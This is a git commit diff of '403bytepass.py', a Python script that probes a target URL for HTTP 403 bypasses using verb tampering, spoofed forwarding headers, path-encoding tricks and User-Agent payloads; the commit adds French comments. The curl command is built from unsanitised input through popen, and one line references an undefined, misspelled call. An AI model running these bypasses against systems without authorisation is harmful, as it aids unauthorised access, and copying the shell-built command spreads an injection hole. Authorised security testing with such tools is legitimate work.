3b21987b86f611a852f914f651be5b9ffd94785f
S1rN3tZ <40497633+mathis2001@users.noreply.github.com>
2022-03-28 11:02:45 +0200

    Commentaires

--- 403bytepass.py
+++ 403bytepass.py
@@ -25,62 +25,67 @@ def banner():
 
 
 def curl_fct(options,test):
-	command = popen("curl -k -s -I %s %s | grep HTTP | tail -1" % (options, test)).read()
+	command = popen("curl -k -s -I %s %s | grep HTTP | tail -1" % (options, test)).read()  #Commande par défaut
+	# -k = connexion sans la sécurité SSL acceptée
+	# -s = mode muet (curl n'affiche rien d'autre que la réponse)
+	# -I = Affiche seulement le header
 
 	try:
-		code = command.strip().split(" ")[1]
+		code = command.strip().split(" ")[1]  #Récupere le code de status
 	except:
-		print(bcolors.FAIL+"[!]"+bcolors.RESET+"No status code")
+		print(bcolors.FAIL+"[!]"+bcolors.RESET+"No status code")  #Si aucun code n'est trouvé on affiche un code d'erreur
 		sys.exit(1)
 
-	if code == "200":
-		command = bcolors.OK+command+bcolors.RESET
+	if code == "200":  #Si le code est un code 200
+		command = bcolors.OK+command+bcolors.RESET #On affiche la réponse en vert
 
-	elif code.startswith("30"):
-		command = bcolors.WARNING+command+bcolors.RESET
+	elif code.startswith("30"):  #Si le code est un code 30X
+		command = bcolors.WARNING+command+bcolors.RESET  #On affiche la réponse en orange
 	
-	elif code.startswith("40") or status.starwith("50"):
-		command = bcolors.FAIL+command+bcolors.RESET
+	elif code.startswith("40") or status.starwith("50"):  #Si le code est un code 40X ou 50X
+		command = bcolors.FAIL+command+bcolors.RESET  #On affiche la réponse en rouge
 	return command
 
 def main():
 
 	try:
-		if len(sys.argv)>2:
-			print(bcolors.INFO+"[*]"+bcolors.RESET+"Usage: python3 403bytepass.py <target>")
-			sys.exit(1)
-		elif len(sys.argv) == 1:
-			print(bcolors.INFO+"[*]"+bcolors.RESET+"Usage: 403python3 bytepass.py <target>")
-		
-		target = sys.argv[1]
-	except Exception as e:
-		sys.exit(1)
+		if len(sys.argv)>2: #Si on utilise trop d'arguments
+			print(bcolors.INFO+"[*]"+bcolors.RESET+"Usage: python3 403bytepass.py <target>") #On affiche un message d'utilisation
+			sys.exit(1)  #On sort du script
+		elif len(sys.argv) == 1:  #Si on n'utilise pas d'arument
+			print(bcolors.INFO+"[*]"+bcolors.RESET+"Usage: python3 403bytepass.py <target>") #On affiche un message d'utilisation
+			sys.exit(1) #On sort du script
+			
+		target = sys.argv[1] #La cible correspond à l'argument
+	except Exception as e:  #Si il y a une erreur
+		sys.exit(1) #On sort du script
 	
-	if not target.startswith("http"):
-		print(bcolors.FAIL+"[!]"+bcolors.RESET+"URL must start with http:// or https://")
+	if not target.startswith("http"):  #On vérifie si l'url de la cible commence bien par http ou https
+		print(bcolors.FAIL+"[!]"+bcolors.RESET+"URL must start with http:// or https://")  #On affiche un message d'erreur et un message d'utilisation
 		print(bcolors.INFO+"[*]"+bcolors.RESET+"Usage: 403python3 bytepass.py <target>")
 		sys.exit(1)
 
-	SlashCheck = target.count("/")
-	if target.endswith("/"):
-		SlashCheck = SlashCheck-1
+	SlashCheck = target.count("/")  #On vérifie le nombre de slash utilisé dans l'url
+	if target.endswith("/"):  #Si l'url fini par un slash
+		SlashCheck = SlashCheck-1 #On enleve un slash au compteur pour la suite
 		print("Target selected: "+target)
 
-	else:
-		print(target+"/")
+	else:  #Sinon
+		print(target+"/") #On ajoute le slash qui manque
 
-	if SlashCheck == 2:
+	if SlashCheck == 2:  #Si on a bien 2 slash dans l'url correspondant au http://
 		uri = ""
-	else:
-		print(bcolors.FAIL+"[!]"+bcolors.RESET+"URL must start with http:// or https://")
+	else:  #Sinon
+		print(bcolors.FAIL+"[!]"+bcolors.RESET+"URL must start with http:// or https://")  #On affiche un message d'erreur et un message d'utilisation
 		print(bcolors.INFO+"[*]"+bcolors.RESET+"Usage: python3 403bytepass.py <target>")
-		sys.exit(1)
+		sys.exit(1)  #On sort du script
 	try:
-		start=time.time()
+		start=time.time() #début du chronomètre à un temps t=0s
 		print("\n")
 		print(bcolors.OK+"[+]"+bcolors.RESET+"Trying bypass with"+bcolors.OK+" VERB TAMPERING"+bcolors.RESET)
 		print("\n")
 		test = target+"/"+uri
+		##################Début des test (VERB TAMPERNG)########################
 		print("Response for GET HTTP Method: ",curl_fct("-X GET",test))
 		print("Response for COPY HTTP Method: ",curl_fct("-X COPY",test))
 		print("Response for OPTIONS HTTP Method: ",curl_fct(" -X OPTIONS",test))
@@ -111,8 +116,11 @@ def main():
 		print("Response for UNLOCK HTTP Method: ",curl_fct(" -X UNLOCK",test))
 		print("Response for UPDATE HTTP Method: ",curl_fct(" -X UPDATE",test))
 		print("Response for VERSION-CONTROL HTTP Method: ",curl_fct(" -X VERSION-CONTROL",test))
-		
 		print("\n")
+		####################Fin des tests (VERB TAMPERING)#######################
+		
+		
+		####################Fin des tests (HEADER)###############################
 		print(bcolors.OK+"[+]"+bcolors.RESET+"Try bypass with"+bcolors.OK+" HEADER"+bcolors.RESET)
 		print("\n")
 		print("HEADER -> Referer : ",curl_fct(" -X GET -H \"Referer: "+test+"\"",test))
@@ -130,7 +138,9 @@ def main():
 		print("HEADER -> X-Host: ",curl_fct(" -X GET -H \"X-Host: 127.0.0.1\"",test))
 		print("HEADER -> X-Forwarded-Host: ",curl_fct(" -X GET -H \"X-Forwarded-Host: 127.0.0.1\"",test))
 		print("\n")
-
+		####################Fin des tests (HEADER)###############################
+		
+		####################Début des tests (Tips)###############################
 		print(bcolors.OK+"[+]"+bcolors.RESET+"Try bypass with"+bcolors.OK+" Bug Bounty Tricks"+bcolors.RESET)
 		print("\n")
 		test=target+"/%2e/"+uri
@@ -155,9 +165,11 @@ def main():
 		test=target+"\;foo=bar/"+uri
 		print("Response  with ;foo=bar;/ between: ",curl_fct(" -X GET --path-as-is",test))
 		stop=time.time()
-		Time=stop-start
+		Time=stop-start #Arret du chronomètre
 		print("\n")
+		####################Fin des tests (Tips)###############################
 		
+		####################Début des tests (User Agent)#######################
 		print(bcolors.OK+"[+]"+bcolors.RESET+"Try bypass with"+bcolors.OK+" Custom User Agent"+bcolors.RESET)
 		test=target+"/"+uri
 
@@ -165,19 +177,19 @@ def main():
 			for payload in f:
 				paystrip=payload.strip()
 				print(paystrip+": "+curl_fct(" -X GET -H \"User-Agent: "+paystrip+"\"",test))
+		####################Fin des tests (User Agent)#########################
 
+		print(bcolors.OK+"[+]"+bcolors.RESET+"Tests finished")  #Fin des tests
+		print(bcolors.OK+"[+]"+bcolors.RESET+"Testing time:", Time)  #Affichage du temps de tests
 
-		print(bcolors.OK+"[+]"+bcolors.RESET+"Tests finished")
-		print(bcolors.OK+"[+]"+bcolors.RESET+"Testing time:", Time)
-
-	except Exception as e:
-		print(bcolors.FAIL+"[!]"+bcolors.RESET+"An error occured")
-		print(e)
-	except KeyboardInterrupt:
-		print(bcolors.FAIL+"[!]"+bcolors.RESET+"Key Interruption: Coming back home")
+	except Exception as e:  #Si il y a une erreur
+		print(bcolors.FAIL+"[!]"+bcolors.RESET+"An error occured")  #On affiche un message d'erreur
+		print(e)  # On affiche l'erreur
+	except KeyboardInterrupt:  #Si il y a une interruption clavier
+		print(bcolors.FAIL+"[!]"+bcolors.RESET+"Key Interruption: Coming back home")  #On affiche un message d'interruption clavier
 
 try:
-	banner()
-	main()
-except Exception as e:
-	print(e)
+	banner()  #affichage bannière
+	main()  #lancement du script
+except Exception as e:  #Si erreur
+	print(e) #affichage erreur
